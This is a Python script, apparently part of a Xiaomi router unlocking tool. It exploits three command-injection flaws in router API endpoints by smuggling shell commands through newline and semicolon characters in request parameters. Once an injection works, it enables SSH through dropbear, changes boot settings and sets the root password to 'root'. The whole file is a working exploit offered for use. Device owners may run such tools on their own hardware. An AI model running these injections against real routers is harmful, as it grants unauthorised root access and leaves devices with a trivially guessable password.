#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import requests

import xmir_base
from gateway import *

web_password = True
if len(sys.argv) > 1 and sys.argv[0].endswith('connect6.py'):
    if sys.argv[1]:
        web_password = sys.argv[1]

try:
    gw = inited_gw
except NameError:
    gw = create_gateway(die_if_sshOk = False, web_login = web_password)


def exploit_1(cmd, api = 'API/misystem/arn_switch'):
    # vuln/exploit author: ?????????
    cmd = cmd.replace(';', '\n')
    params = { 'open': 0, 'mode': 1, 'level': "\n" + cmd + "\n" }
    res = gw.api_request(api, params, resp = 'text')
    time.sleep(0.5)
    return res

def exploit_2(cmd, api = 'API/xqsystem/start_binding'):
    # vuln/exploit author: ?????????
    cmd = cmd.replace(';', '\n')
    params = { 'uid': 1234, 'key': "1234' -X \n" + cmd + "\n logger -t X 'X" }
    try:
        res = gw.api_request(api, params, resp = 'text', timeout = 1.5)
    except requests.exceptions.ReadTimeout:
        res = ''
    return res

def exploit_3(cmd, api = 'API/xqsystem/set_mac_filter'):
    # vuln/exploit author: ?????????
    if '\n' in cmd:
        raise ValueError('Incorrect shell command format')
    options = { 'add': 0, 'del': 1 }
    for action, option in options.items():
        time.sleep(0.05)
        time_ms = time.time_ns() // 1_000_000
        name = f'xxx ; uci set diag.config.usb_read_thr={time_ms} ; uci commit diag ; ' + cmd
        params = { 'mac': '00:00:00:00:00:33', 'name': name, 'option': option, 'wan': '' }
        try:
            res = gw.api_request(api, params, resp = 'text', timeout = 2)
        except requests.exceptions.ReadTimeout:
            res = ''
        if not res or '"code":0' not in res:
            return ''
        diag = gw.get_diag_paras(timeout = 2)
        if str(diag['usb_read_thr']) == str(time_ms):
            return res  # Ok
    return ''


# set default value for iperf_test_thr
gw.set_diag_iperf_test_thr(20)

vuln_test_num = 82000011
exec_cmd = None
exp_list = [ exploit_2, exploit_1, exploit_3 ]
for idx, exp_func in enumerate(exp_list):
    exp_test_num = vuln_test_num + idx
    res = exp_func(f"uci set diag.config.iperf_test_thr={exp_test_num} ; uci commit diag")
    #if '"code":0' not in res:
    #    continue
    iperf_test_thr = gw.get_diag_iperf_test_thr()
    if iperf_test_thr == str(exp_test_num):
        exec_cmd = exp_func
        break
    time.sleep(0.5)

# set default value for iperf_test_thr
gw.set_diag_iperf_test_thr(20)

if not exec_cmd:
    raise ExploitNotWorked('Exploits "arn_switch/start_binding/set_mac_filter" not working!!!')

if exec_cmd == exploit_1:
    print('Exploit "arn_switch" detected!') 

if exec_cmd == exploit_2:
    print('Exploit "start_binding" detected!') 

if exec_cmd == exploit_3:
    print('Exploit "set_mac_filter" detected!') 


exec_cmd(r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
exec_cmd(r"nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit")
exec_cmd(r"echo -e 'root\nroot' > /tmp/psw.txt ; passwd root < /tmp/psw.txt")
exec_cmd(r"/etc/init.d/dropbear enable")

print('Run SSH server on port 22 ...')
exec_cmd(r"/etc/init.d/dropbear restart")
exec_cmd(r"logger -t XMiR ___completed___")

time.sleep(0.5)

gw.post_connect(exec_cmd)
